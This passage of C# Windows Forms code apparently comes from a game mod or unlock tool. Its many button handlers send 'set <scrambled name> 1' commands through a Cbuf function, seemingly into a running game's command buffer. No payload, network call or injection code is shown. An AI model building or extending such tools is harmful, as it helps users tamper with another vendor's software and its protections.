            this.Cbuf("set OKTLSQMTOP 1");
            this.Cbuf("set NTNLSSTMQK 1");
            this.Cbuf("set PORQNRQP 1");
            this.Cbuf("set LPNRRKQQQO 1");
            this.Cbuf("set MMPRQRSPOP 1");
            this.Cbuf("set NLQKPRSMLT 1");
            this.Cbuf("set NOPLNKORSM 1");
            this.Cbuf("set LKRKKMPKQN 1");
            this.Cbuf("set MMLKKNQTRS 1");
            this.Cbuf("set TKPTLPSNR 1");
            this.Cbuf("set LSLRLKSNM 1");
            this.Cbuf("set MTTKNLQQQP 1");
            this.Cbuf("set LMRRQQOKO 1");
            this.Cbuf("set LOLMPNLQLK 1");
            this.Cbuf("set LNNTTKNOPT 1");
            this.Cbuf("set MROQSKORRK 1");
            this.Cbuf("set OKRSNPKTLS 1");
            this.Cbuf("set LNMNLQP 1");
            this.Cbuf("set MPNNNKPLQM 1");
            this.Cbuf("set LSKTQNPKKN 1");
            this.Cbuf("set MMPNQSNSNN 1");
            this.Cbuf("set OOPPRRRSM 1");
            this.Cbuf("set MLQKNLMPQR 1");
            this.Cbuf("set MORKNPPSMR 1");
            this.Cbuf("set SQPLNKSOK 1");
            this.Cbuf("set NTLRRMTQMM 1");
            this.Cbuf("set MQLTOQPRLT 1");
            this.Cbuf("set LPOLPTMPKM 1");
        }

        private void metroButton14_Click_6(object sender, EventArgs e)
        {
            
            this.Cbuf("set TKNTTMTSN 1");
            this.Cbuf("set PTQMQOKQ 1");
            this.Cbuf("set MSRSNMNKQP 1");
            this.Cbuf("set MMNSONTQOT 1");
            this.Cbuf("set LPRNSKRQMS 1");
            this.Cbuf("set NMTQRLSPPQ 1");
            this.Cbuf("set LTSTRSPKM 1");
      
        }

        private void metroButton9_Click_2(object sender, EventArgs e)
        {

            this.Cbuf("set  NMLRRLKQLR 1");
            this.Cbuf("set  MKNRTSSKTS 1");
            this.Cbuf("set LTNRTMMPKQ 1");
            this.Cbuf("set RLNRSSQKM 1");
            this.Cbuf("set  LORONQMPKO 1");
            this.Cbuf("set OPPPMPTPL 1");
        }

        private void metroButton5_Click_8(object sender, EventArgs e)
        {
            this.Cbuf("set NNPSNQLLKT 1");
            this.Cbuf("set NOOLPRQMTR 1");
            this.Cbuf("set LRKTPTKKLN 1");
            this.Cbuf("set SPQNNSTLP 1");
            this.Cbuf("set LNLLTMNQOP 1");
            this.Cbuf("set MTTMOPOMRN 1");
            this.Cbuf("set LRPONOSQN 1");
            this.Cbuf("set MPOSOTKQMS 1");
            this.Cbuf("set OMLTKPQRNL 1");
            this.Cbuf("set MOKSKTKTLQ 1");
            this.Cbuf("set LPNQOKLRQR 1");
            this.Cbuf("set MKMRMNPMMN 1");
            this.Cbuf("set NRQMNPOQQN 1");
            this.Cbuf("set NNKKRRMOLN 1");
        }

        private void metroButton6_Click_12(object sender, EventArgs e)
        {
            
            this.Cbuf("set MKOLLTMMLM 1");
            this.Cbuf("set NMTQNKOOS 1");
            this.Cbuf("set MTNTQNKMPO 1");
            this.Cbuf("set MKMSOLRQML 1");
        }

        private void metroButton17_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set  NOLNTMSMPL 1");
            this.Cbuf("set NTSOOPTPOL 1");
            this.Cbuf("set NTKRNNLQOQ 1");
            this.Cbuf("set MRKNLKLOLP 1");
            this.Cbuf("set MMRNPTNSQ 1");
            this.Cbuf("set LRQMRKNTLL 1");
        }

        private void metroButton13_Click_7(object sender, EventArgs e)
        {

        }

        private void metroButton18_Click_1(object sender, EventArgs e)
        {

        }

        private void metroButton14_Click_7(object sender, EventArgs e)
        {
            this.Cbuf("set MKOLLTMMLM 1");
        }

        private void metroButton17_Click_5(object sender, EventArgs e)
        {
            {
                this.Cbuf("set  MMSTLSTOQK 1");
                this.Cbuf("set LLNKNQLRTP 1");
                this.Cbuf("set LPKSQRROQ 1");
                this.Cbuf("set MTNQQLTKQT 1");
                this.Cbuf("set NMOSNONTK 1");
                this.Cbuf("set LLNTKRPPQK 1");
                this.Cbuf("set  OKKTMLKNNR 1");
                this.Cbuf("set SRKPNTSRM 1");
                this.Cbuf("set MSSMKNPMOO 1");
                this.Cbuf("set OKQKMQMTRQ 1");
                this.Cbuf("set MLKPNOMPST 1");
                this.Cbuf("set MORPOLQMSK 1");
                this.Cbuf("set NLMQNNTTMM 1");
                this.Cbuf("set NNKRMTSNPL 1");
                this.Cbuf("set OQSPSSNRT 1");
                this.Cbuf("set NTMOSTPSM 1");
                this.Cbuf("set NSQOOQNQTM 1");
                this.Cbuf("set MRSTKSMMP 1");
                this.Cbuf("set RMRSOQSQL 1");
                this.Cbuf("set LNLKRSOKML 1");
                this.Cbuf("set RMNRQNKMK 1");
                this.Cbuf("set LOPPQMRSNT 1");
                this.Cbuf("set LPSPQQMMNR 1");
                this.Cbuf("set SONPKLQPK 1");
            }
        }

        private void metroButton18_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set LMMLPTTTK 1");
            this.Cbuf("set LRSPNPPPTP 1");
            this.Cbuf("set NOTLPKOSO 1");
            this.Cbuf("set OLOPMPMMOT 1");
            this.Cbuf("set MOQONRPQOT 1");
            this.Cbuf("set NTPTNSQRK 1");
            this.Cbuf("set OKRMSSLMMO 1");
            this.Cbuf("set SLSMSSTQP 1");
            this.Cbuf("set OSRSSRQOS 1");
            this.Cbuf("set LNTNPRQSNL 1");
            this.Cbuf("set MSTLTQKSNS 1");
            this.Cbuf("set LRNPKOQSKM 1");
            this.Cbuf("set LTMOMNTNNN 1");
            this.Cbuf("set NQLLRKPRPR 1");
            this.Cbuf("set OMQRTSKPOS 1");
            this.Cbuf("set RLKSLTQMQ 1");
            this.Cbuf("set NPRQLNTRTK 1");
            this.Cbuf("set MPNORSMRPR 1");
            this.Cbuf("set LPSOLLSTTS 1");
            this.Cbuf("set TLTRLOSTT 1");
            this.Cbuf("set MMQLSKSKTO 1");
            this.Cbuf("set LSLLLMORKM 1");
            this.Cbuf("set LMSPNQOPNK 1");
            this.Cbuf("set NTLLQPKLTT 1");
        }

        private void metroButton10_Click_5(object sender, EventArgs e)
        {
            this.Cbuf("set SSOOSTOMR 1");
        }

        private void metroButton16_Click_7(object sender, EventArgs e)
        {
            this.Cbuf("set MKOLLTMMLM 1");
        }

        private void metroButton4_Click_6(object sender, EventArgs e)
        {
            this.Cbuf("set MTOQTLSTL 1");
            this.Cbuf("set LQKMKMLKSM 1");
            this.Cbuf("set NPMPORMQRK 1");
            this.Cbuf("set MLQQQQNTMT 1");
            this.Cbuf("set NRLNOQNMML 1");
            this.Cbuf("set OPPQONOSK 1");
            this.Cbuf("set RSOOSRLMK 1");
        }

        private void metroButton5_Click_9(object sender, EventArgs e)
        {
            this.Cbuf("set MMRMSTQNRQ 1");
            this.Cbuf("set RMMTRKTMQ 1");
            this.Cbuf("set MPLNTKOKKM 1");
            this.Cbuf("set NROMONSMSL 1");
            this.Cbuf("set NMLSLKOOTO 1");
            this.Cbuf("set PONQPTKNK 1");
        }

        private void metroButton5_Click_10(object sender, EventArgs e)
        {
            this.Cbuf("set NTLLQPKLTT 1");
        }

        private void metroButton22_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set LMMLPTTTK 1");
            this.Cbuf("set LRSPNPPPTP 1");
            this.Cbuf("set NOTLPKOSO 1");
            this.Cbuf("set OLOPMPMMOT 1");
        }

        private void metroButton10_Click_6(object sender, EventArgs e)
        {
            this.Cbuf("set MOQONRPQOT 1");
            this.Cbuf("set NTPTNSQRK 1");
            this.Cbuf("set OKRMSSLMMO 1");
        }

        private void metroButton21_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set SLSMSSTQP 1");
            this.Cbuf("set OSRSSRQOS 1");
            this.Cbuf("set LNTNPRQSNL 1");
            this.Cbuf("set MSTLTQKSNS 1");
            this.Cbuf("set LRNPKOQSKM 1");
            this.Cbuf("set LTMOMNTNNN 1");
            this.Cbuf("set NQLLRKPRPR 1");
            this.Cbuf("set OMQRTSKPOS 1");
            this.Cbuf("set RLKSLTQMQ 1");
        }

        private void metroButton6_Click_13(object sender, EventArgs e)
        {

            this.Cbuf("set SONPKLQPK 1");
        }

        private void metroButton13_Click_8(object sender, EventArgs e)
        {
            this.Cbuf("set MLKPNOMPST 1");
            this.Cbuf("set MORPOLQMSK 1");
        }

        private void metroButton16_Click_8(object sender, EventArgs e)
        {
            this.Cbuf("set LNLKRSOKML 1");
        }


        private void metroButton10_Click_7(object sender, EventArgs e)
        {
            this.Cbuf("set NPRQLNTRTK 1");
        }

        private void metroButton14_Click_8(object sender, EventArgs e)
        {
            this.Cbuf("set MPNORSMRPR 1");
        }

        private void metroButton20_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set LPSOLLSTTS 1");
        }

        private void metroButton21_Click_5(object sender, EventArgs e)
        {
            this.Cbuf("set TLTRLOSTT 1");
        }

        private void metroButton22_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set MMQLSKSKTO 1");
        }

        private void metroButton23_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set LSLLLMORKM 1");
        }

        private void metroButton24_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set LMSPNQOPNK 1");
        }

        
        private void guna2ToggleSwitch37_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void metroButton8_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set RMNRQNKMK 1");
        }

        private void metroButton14_Click_9(object sender, EventArgs e)
        {
            this.Cbuf("set LOPPQMRSNT 1");
        }

        private void metroButton18_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set LPSPQQMMNR 1");
        }

        private void metroButton23_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set LPKSQRROQ 1");
        }

        private void metroButton20_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set NLMQNNTTMM 1");
        }

        private void metroButton29_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set NNKRMTSNPL 1");
        }

        private void metroButton30_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set OQSPSSNRT 1");
        }

        private void metroButton35_Click(object sender, EventArgs e)
        {
            this.Cbuf("set NTMOSTPSM 1");
        }

        private void metroButton34_Click(object sender, EventArgs e)
        {
            this.Cbuf("set NSQOOQNQTM 1");
        }

        private void metroButton33_Click(object sender, EventArgs e)
        {
            this.Cbuf("set MRSTKSMMP 1");
        }

        private void metroButton32_Click(object sender, EventArgs e)
        {
            this.Cbuf("set RMRSOQSQL 1");
        }

        private void metroButton21_Click_6(object sender, EventArgs e)
        {
            this.Cbuf("set  MMSTLSTOQK 1");
        }

        private void metroButton22_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set LLNKNQLRTP 1");
        }

        private void metroButton24_Click_5(object sender, EventArgs e)
        {
            this.Cbuf("set MTNQQLTKQT 1");
        }

        private void metroButton25_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set MTNQQLTKQT 1");
        }

        private void metroButton26_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set NMOSNONTK 1");
        }

        private void metroButton27_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set LLNTKRPPQK 1");
        }

        private void metroButton28_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set OKKTMLKNNR 1");
        }

        private void metroButton36_Click(object sender, EventArgs e)
        {
            this.Cbuf("set SRKPNTSRM 1");
        }

        private void metroButton37_Click(object sender, EventArgs e)
        {
            this.Cbuf("set MSSMKNPMOO 1");
        }

        private void metroButton38_Click(object sender, EventArgs e)
        {
            this.Cbuf("set OKQKMQMTRQ 1");
        }

        private void guna2ToggleSwitch38_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void metroButton21_Click_7(object sender, EventArgs e)
        {
            this.Cbuf("set MLKPNOMPST 1");
          
        }

        private void metroButton22_Click_5(object sender, EventArgs e)
        {
            this.Cbuf("set MORPOLQMSK 1");
        }

       

      

        private void metroButton5_Click_11(object sender, EventArgs e)
        {
           
           
            this.Cbuf("set RMNRQNKMK 1");
            this.Cbuf("set LOPPQMRSNT 1");
            this.Cbuf("set LPSPQQMMNR 1");
            this.Cbuf("set SONPKLQPK 1");
        }

        private void metroButton21_Click_8(object sender, EventArgs e)
        {
          
            
            this.Cbuf("set NLMQNNTTMM 1");
            this.Cbuf("set NNKRMTSNPL 1");
        }

        private void metroButton10_Click_8(object sender, EventArgs e)
        {
           
            this.Cbuf("set MRSTKSMMP 1");
            this.Cbuf("set RMRSOQSQL 1");
            this.Cbuf("set LNLKRSOKML 1");
        }

        private void metroButton8_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set  MMSTLSTOQK 1");
            this.Cbuf("set LLNKNQLRTP 1");
            this.Cbuf("set LPKSQRROQ 1");
            this.Cbuf("set MTNQQLTKQT 1");
            this.Cbuf("set NMOSNONTK 1");
            this.Cbuf("set LLNTKRPPQK 1");
            this.Cbuf("set OKKTMLKNNR 1");
            this.Cbuf("set SRKPNTSRM 1");
        }

       

        private void metroButton5_Click_12(object sender, EventArgs e)
        {
            this.Cbuf("set NSQOOQNQTM 1");
        }

        private void metroButton8_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set MLKPNOMPST 1");
        }

        private void metroButton10_Click_9(object sender, EventArgs e)
        {
            this.Cbuf("set NTMOSTPSM 1");
        }

        private void metroButton5_Click_13(object sender, EventArgs e)
        {
            this.Cbuf("set OQSPSSNRT 1");
        }

        private void metroButton14_Click_10(object sender, EventArgs e)
        {
            this.Cbuf("set MSSMKNPMOO 1");
            this.Cbuf("set OKQKMQMTRQ 1");
        }

        private void metroButton6_Click_14(object sender, EventArgs e)
        {
            this.Cbuf("set LORONQMPKO 1");
        }

        private void metroButton13_Click_9(object sender, EventArgs e)
        {
            this.Cbuf("set  NMLRRLKQLR 1");
            this.Cbuf("set  MKNRTSSKTS 1");
            this.Cbuf("set LTNRTMMPKQ 1");
        }

        private void metroButton5_Click_14(object sender, EventArgs e)
        {
            this.Cbuf("set MORPOLQMSK 1");
        }

        private void metroButton14_Click_11(object sender, EventArgs e)
        {
            this.Cbuf("set OMPSKRMROL 1");
            this.Cbuf("set MTSKONMSOO 1");
            this.Cbuf("set ONKRLLRSP 1");
            this.Cbuf("set LQQQTRQRLN 1");
            this.Cbuf("set PPLNNTNTP 1");
            this.Cbuf("set NPTLTMLLMN 1");
            this.Cbuf("set NRKSTMPPQK 1");
            this.Cbuf("set PKKOSROQM 1");
            this.Cbuf("set LSLQOMPPOK 1");
            this.Cbuf("set MNPLQPMLNT 1");
            this.Cbuf("set NMQQNNQNSO 1");
            this.Cbuf("set LQKORRQMLR 1");
            this.Cbuf("set NNTTKSKSKK 1");
            this.Cbuf("set MKQQQTPRST 1");
            this.Cbuf("set OMOOMOSMNT 1");
            this.Cbuf("set MTOMPPQPNR 1");
            this.Cbuf("set LOLSPQKKQK 1");
            this.Cbuf("set MSQTTSOKRN 1");
            this.Cbuf("set STLRTMLSP 1");
            this.Cbuf("set OMLRMTTPQN 1");
            this.Cbuf("set NSORRORRM 1");
            this.Cbuf("set QKKMRRLRR 1");
            this.Cbuf("set MPLSTSPKPT 1");
            this.Cbuf("set NRQOKTRTMQ 1");
            this.Cbuf("set NOOSMRSQLK 1");
            this.Cbuf("set LTNOTRKOON 1");
            this.Cbuf("set LTPQTTPSOR 1");
            this.Cbuf("set MMMOQLSSOS 1");
            this.Cbuf("set SOKNOQRPL 1");
            this.Cbuf("set OMKRNTLOQO 1");
            this.Cbuf("set NPPRSOTNLR 1");
            this.Cbuf("set NSORSLLORM 1");
            this.Cbuf("set NRSSTQQSKK 1");
        }

        private void metroButton13_Click_10(object sender, EventArgs e)
        {
            this.Cbuf("set RLNRSSQKM 1");
        }

        private void metroButton17_Click_6(object sender, EventArgs e)
        {
            this.Cbuf("set OPPPMPTPL 1");
        }

     

        private void metroButton5_Click_15(object sender, EventArgs e)
        {
            
            this.Cbuf("set RLKSLTQMQ 1");
            this.Cbuf("set NPRQLNTRTK 1");
            this.Cbuf("set MPNORSMRPR 1");
            this.Cbuf("set LPSOLLSTTS 1");
            this.Cbuf("set TLTRLOSTT 1");
            this.Cbuf("set MMQLSKSKTO 1");
            this.Cbuf("set LSLLLMORKM 1");
            this.Cbuf("set LMSPNQOPNK 1");
            this.Cbuf("set NTLLQPKLTT 1");
        }

        private void metroButton6_Click_15(object sender, EventArgs e)
        {
            this.Cbuf("set LMMLPTTTK 1");
            this.Cbuf("set LRSPNPPPTP 1");
            this.Cbuf("set NOTLPKOSO 1");
            this.Cbuf("set OLOPMPMMOT 1");
            this.Cbuf("set MOQONRPQOT 1");
            this.Cbuf("set NTPTNSQRK 1");
            this.Cbuf("set OKRMSSLMMO 1");
            this.Cbuf("set SLSMSSTQP 1");
            this.Cbuf("set OSRSSRQOS 1");
            this.Cbuf("set LNTNPRQSNL 1");
            this.Cbuf("set MSTLTQKSNS 1");
            this.Cbuf("set LRNPKOQSKM 1");
            this.Cbuf("set LTMOMNTNNN 1");
            this.Cbuf("set NQLLRKPRPR 1");
            this.Cbuf("set OMQRTSKPOS 1");
        }

        private void metroButton16_Click_9(object sender, EventArgs e)
        {

        }

        private void metroButton10_Click_10(object sender, EventArgs e)
        {

            this.Cbuf("set LSLLLMORKM 1");
        
        }

        private void metroButton11_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set MPNORSMRPR 1");
            this.Cbuf("set LPSOLLSTTS 1");
        }

        private void metroButton8_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set LMSPNQOPNK 1");
            this.Cbuf("set NTLLQPKLTT 1");
        }

        private void metroButton9_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set RLKSLTQMQ 1");
            this.Cbuf("set NPRQLNTRTK 1");
        }

        private void metroButton12_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set TLTRLOSTT 1");
            this.Cbuf("set MMQLSKSKTO 1");
        }

        private void metroButton5_Click_16(object sender, EventArgs e)
        {
            this.Cbuf("set RLKSLTQMQ 1");
        }

        private void metroButton6_Click_16(object sender, EventArgs e)
        {
            this.Cbuf("set NPRQLNTRTK 1");
        }

        private void metroButton8_Click_5(object sender, EventArgs e)
        {
            this.Cbuf("set LPSOLLSTTS 1");
        }

        private void metroButton10_Click_11(object sender, EventArgs e)
        {
            this.Cbuf("set MPNORSMRPR 1");
        }

        private void guna2ToggleSwitch45_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch45_CheckedChanged_1(object sender, EventArgs e)
        {

        }

      

       

       

        private void metroButton6_Click_17(object sender, EventArgs e)
        {
           
           
            this.Cbuf("set LKSLTSNQNQ 1");
            this.Cbuf("set LKTMQRMOST 1");
            this.Cbuf("set NKKOSROQNT 1");
            this.Cbuf("set NKKPNSRLMM 1");
            this.Cbuf("set TNMMPPMKQ 1");
            this.Cbuf("set LKSOPMLKPL 1");
            this.Cbuf("set NOPOKPTTMT 1");
            this.Cbuf("set LQSPNQOLLQ 1");
            this.Cbuf("set SPTSSTKLP 1");

        }

        private void metroButton8_Click_6(object sender, EventArgs e)
        {
           
            this.Cbuf("set SRRNROQSR 1");
            this.Cbuf("set LONRNSRQMQ 1");
            this.Cbuf("set OQLTNPMQR 1");
            this.Cbuf("set MNPOSMMMSN 1");
            this.Cbuf("set NKQSMRSNNR 1");
            this.Cbuf("set NSKMOMQSTT 1");
            this.Cbuf("set MTRNPQQQMR 1");
            this.Cbuf("set NQPPKLOQLO 1");
            this.Cbuf("set MNMTQSTKKO 1");
            this.Cbuf("set NLQNMMNMMO 1");
            this.Cbuf("set MKLNSNSQSK 1");
            this.Cbuf("set LMPORKRLSQ 1");
            this.Cbuf("set MPTTNLRPOS 1");
            this.Cbuf("set LMLPRQOMKS 1");
        }

        private void metroButton10_Click_12(object sender, EventArgs e)
        {
            this.Cbuf("set LNNKPKSLPO 1");
            this.Cbuf("set OMRTLLLTRL 1");
            this.Cbuf("set NTOOLLKSKT 1");
            this.Cbuf("set LQMTLNQSLL 1");
            this.Cbuf("set LMOSKRTPSL 1");
            this.Cbuf("set LOQSMNQPOQ 1");
            this.Cbuf("set NOTSTROLOM 1");
            this.Cbuf("set LQQNNLOTPT 1");
            this.Cbuf("set MKKPONRQR 1");
            this.Cbuf("set LQLNOSSPM 1");
            this.Cbuf("set MNNPKMKQSL 1");
            this.Cbuf("set NPMSSLLMLT 1");
            this.Cbuf("set OKRNKSLPMT 1");
            this.Cbuf("set LKKMMRMPLR 1");
            this.Cbuf("set LQSPKQSPTM 1");
            this.Cbuf("set NOLPMRPLRM 1");
            this.Cbuf("set LQRMRKSMTO 1");
            this.Cbuf("set LQQPQLMMOR 1");
            this.Cbuf("set NSMPRQOSQL 1");
            this.Cbuf("set LTQTKNKPNN 1");
            this.Cbuf("set LOSNRSQSNO 1");
            this.Cbuf("set NPTPOSPRNK 1");
            this.Cbuf("set NNNPONTNSN 1");
            this.Cbuf("set NORLNTNQLL 1");
            this.Cbuf("set LMQRSRQQSR 1");
            this.Cbuf("set NQNOSSTNOM 1");
            this.Cbuf("set MPOOPRQRNR 1");
        }

        private void metroButton12_Click_5(object sender, EventArgs e)
        {
            this.Cbuf("set NRSSNMNLLL 1");
            this.Cbuf("set ROSRMLLKM 1");
            this.Cbuf("set MPPMNQQRPT 1");
            this.Cbuf("set MLTTRLKPS 1");
            this.Cbuf("set PTONNRNQ 1");
            this.Cbuf("set MSLOQLMTRT 1");
            this.Cbuf("set NNPRNQMTQO 1");
            this.Cbuf("set MSRRMTLOQP 1");
            this.Cbuf("set NPNQOLKSLP 1");
            this.Cbuf("set MQNSRRKQOT 1");
            this.Cbuf("set OLMPOQOPTT 1");
            this.Cbuf("set NTRNROLSQL 1");
            this.Cbuf("set MPRTTPPOT 1");
            this.Cbuf("set ONNPLTTTM 1");
            this.Cbuf("set MPOSPQTTNR 1");
            this.Cbuf("set ROTRKSQNT 1");
            this.Cbuf("set MOLOQRLLQK 1");
            this.Cbuf("set MMOOTLNTNR 1");
            this.Cbuf("set MOOMOLTQSP 1");
            this.Cbuf("set OTPQONQQT 1");
            this.Cbuf("set LKQROKRTLN 1");
            this.Cbuf("set LOKOLPNMNP 1");
            this.Cbuf("set LPLPNLSORL 1");
            this.Cbuf("set OQLLQNMS 1");
            this.Cbuf("set MNQTSRMPMP 1");
            this.Cbuf("set MSKPMNRQTS 1");
            this.Cbuf("set OKMSPKPMLO 1");
            this.Cbuf("set LSRQOQNRMM 1");
        }

        private void metroButton13_Click_11(object sender, EventArgs e)
        {
            this.Cbuf("set MSRSTLNLTM 1");
            this.Cbuf("set MKMMQLLLSN 1");
            this.Cbuf("set LPNPSRNSMQ 1");
            this.Cbuf("set OQMTOQTSS 1");
            this.Cbuf("set LQNLSMLQTS 1");
            this.Cbuf("set LSLPPRMTLR 1");
            this.Cbuf("set LQQSPONNOK 1");
            this.Cbuf("set NPMLTLMSKS 1");
            this.Cbuf("set LRQOORNNQS 1");
            this.Cbuf("set NOLNTPPQSO 1");
            this.Cbuf("set QTNMNLKMM 1");
            this.Cbuf("set NNQRLTQNNK 1");
            this.Cbuf("set LKORRRQNPR 1");
            this.Cbuf("set MTQSNPMOTQ 1");
            this.Cbuf("set NPPRRPOLLL 1");
            this.Cbuf("set MTNMKSLKL 1");
            this.Cbuf("set LSOQLQTOTK 1");
            this.Cbuf("set LTORSQOPQO 1");
            this.Cbuf("set NOPPTTNRNR 1");
            this.Cbuf("set OMSTQOKTNQ 1");
            this.Cbuf("set LROPKRSOL 1");
            this.Cbuf("set LQTMQOTTTQ 1");
            this.Cbuf("set NLONMPSRPP 1");
            this.Cbuf("set NPSTPKMPKS 1");
            this.Cbuf("set MNLKTLKTPM 1");
            this.Cbuf("set OKRROQNRPK 1");
        }

        private void metroButton13_Click_12(object sender, EventArgs e)
        {
            this.Cbuf("set LLNKPKTSTL 1");
            this.Cbuf("set MPPPQPPQNP 1");
            this.Cbuf("set QOTRQLLKK 1");
            this.Cbuf("set MMRMSQKQRS 1");
            this.Cbuf("set NLTRRSLOKQ 1");
            this.Cbuf("set RLKOPMNRM 1");
            this.Cbuf("set TTRLOKSMS 1");
            this.Cbuf("set NONSRTQORS 1");
            this.Cbuf("set LTRMRRONMO 1");
            this.Cbuf("set NRLNMKTPQ 1");
            this.Cbuf("set OKLSLRLLOR 1");
            this.Cbuf("set LLSLRPKOMO 1");
            this.Cbuf("set PQRNNSNSP 1");
            this.Cbuf("set LTLLKQNKSN 1");
            this.Cbuf("set NSSPKSPTSL 1");
            this.Cbuf("set TTMTRQOKO 1");
            this.Cbuf("set LRRSSPTSRQ 1");
            this.Cbuf("set MMTNTRMSLL 1");
            this.Cbuf("set MTPNNRQLOK 1");
            this.Cbuf("set NQTTMLPRNL 1");
            this.Cbuf("set PNMPSQNON 1");
            this.Cbuf("set LQSMQPLTRN 1");
            this.Cbuf("set NTPPKLNKNM 1");
            this.Cbuf("set MKOSKLNLOL 1");
            this.Cbuf("set LKLRLONQRR 1");
            this.Cbuf("set MNTQTPSKTR 1");
            this.Cbuf("set LSPKSLNMNK 1");
            this.Cbuf("set NKOTPSQLRQ 1");
        }

        private void metroButton27_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set LRNMQRTPM 1");
            this.Cbuf("set NQTPSMTLQM 1");
        }

        private void metroButton26_Click_5(object sender, EventArgs e)
        {
            this.Cbuf("set LPSPNKLRPO 1");
            this.Cbuf("set MKNMSLSLRL 1");
            this.Cbuf("set NMORQOTSK 1");
            this.Cbuf("set RMLOTKMMM 1");
            this.Cbuf("set LNQSSLTOSP 1");
            this.Cbuf("set LSOPQMRPNR 1");
            this.Cbuf("set NKTRSSTMRQ 1");
            this.Cbuf("set MLTTMLTKOR 1");
            this.Cbuf("set OMRQKMSSPP 1");
            this.Cbuf("set TMTNNMTLL 1");
            this.Cbuf("set LMLTRQKKTL 1");
            this.Cbuf("set LNLLSQTRLM 1");
            this.Cbuf("set NSSPMPLRQL 1");
            this.Cbuf("set MKRSSOQLML 1");
            this.Cbuf("set NPORSPPNOK 1");
            this.Cbuf("set OQSOKOKRQ 1");
            this.Cbuf("set MQPLMMMPRT 1");
            this.Cbuf("set LTKQTLPOLT 1");
            this.Cbuf("set LNNQQMNNPM 1");
            this.Cbuf("set MPPMOTSLNN 1");
            this.Cbuf("set LMTMRLMOT 1");
            this.Cbuf("set MLMMSONQMQ 1");
            this.Cbuf("set NKMKNNLOTK 1");
            this.Cbuf("set LRTMOMKOLS 1");
            this.Cbuf("set MMTRTMPLON 1");
            this.Cbuf("set MLRRQLNRNP 1");
            this.Cbuf("set NLQSRKOKKK 1");
            this.Cbuf("set NNSSPPRQKM 1");
            this.Cbuf("set MLSRTRQRKR 1");
            this.Cbuf("set MNRQLMKLKL 1");
            this.Cbuf("set MKMNRNNKK 1");
            this.Cbuf("set MSPTLTSQRS 1");
            this.Cbuf("set OMPNTNLMSO 1");
            this.Cbuf("set RLTQMLOM 1");
            this.Cbuf("set QTTLONPKS 1");
            this.Cbuf("set LTTLOLKPQP 1");
            this.Cbuf("set PTOTPLMNR 1");
            this.Cbuf("set MLPMKONLSM 1");
            this.Cbuf("set MQMSQPPSMR 1");
            this.Cbuf("set PPQKNQNTO 1");
            this.Cbuf("set NSMNKSTNLL 1");
            this.Cbuf("set LSSQNNPMTT 1");
            this.Cbuf("set NSQSPRLNOT 1");
            this.Cbuf("set NPNPOQLRRP 1");
            this.Cbuf("set MTKKTTOK 1");
            this.Cbuf("set MNMRPKQNKQ 1");
            this.Cbuf("set LKPKOSQSRS 1");
            this.Cbuf("set OMPNQKNLRN 1");
            this.Cbuf("set NTSPPKTNK 1");
        }

        private void metroButton25_Click_5(object sender, EventArgs e)
        {
            this.Cbuf("set MOOKSPSMMO 1");
            this.Cbuf("set LTOQRMMOOT 1");
            this.Cbuf("set MTLQRTRORP 1");
            this.Cbuf("set NRMLMQMPQK 1");
            this.Cbuf("set MKPLKOSKQS 1");
            this.Cbuf("set OMMMKOTRPK 1");
            this.Cbuf("set NKRRTTLSNL 1");
            this.Cbuf("set LTLSMQNSKR 1");
            this.Cbuf("set MMLRQOPMMS 1");
            this.Cbuf("set NPLQMOQNQQ 1");
            this.Cbuf("set LNTLORQNMO 1");
            this.Cbuf("set OKTMMPNRMN 1");
            this.Cbuf("set LPMLRKTKPO 1");
            this.Cbuf("set LLLRTQOTKS 1");
            this.Cbuf("set OLPTLPNMO 1");
            this.Cbuf("set LKQOKQTNQS 1");
            this.Cbuf("set TSRPRLMTO 1");
            this.Cbuf("set TNRROQMMK 1");
            this.Cbuf("set LPQNPPNLSQ 1");
            this.Cbuf("set LKOLQSMSRT 1");
            this.Cbuf("set SSOKKRMRM 1");
            this.Cbuf("set MSONONRMKO 1");
            this.Cbuf("set LLTRSLRPTL 1");
            this.Cbuf("set NNTKQMMSMM 1");
            this.Cbuf("set LKOLMLQRRT 1");
            this.Cbuf("set NNONKTMKRQ 1");
            this.Cbuf("set LNNNQOSSQQ 1");
            this.Cbuf("set LTSRTRRSNQ 1");
            this.Cbuf("set MTQNPPMQRT 1");
            this.Cbuf("set MMNOKOORO 1");
            this.Cbuf("set MOLOPNLRPM 1");
            this.Cbuf("set NRSQQSPLL 1");
            this.Cbuf("set NPQTMORRNS 1");
            this.Cbuf("set LNRTSPSMTN 1");
            this.Cbuf("set LROLRKTLMS 1");
            this.Cbuf("set LNOSSNSNTK1");
            this.Cbuf("set OTTRLMNPT 1");
            this.Cbuf("set MKOLPSNSMN 1");
            this.Cbuf("set MQNOQNKRP 1");
            this.Cbuf("set LTNTMKKTPN 1");
            this.Cbuf("set NLSMMKNMTN 1");
            this.Cbuf("set NNMKTTLLLN 1");
            this.Cbuf("set MSRSPQNQKP 1");
            this.Cbuf("set LOLTKOLKON 1");
            this.Cbuf("set MSKKQLOTT 1");
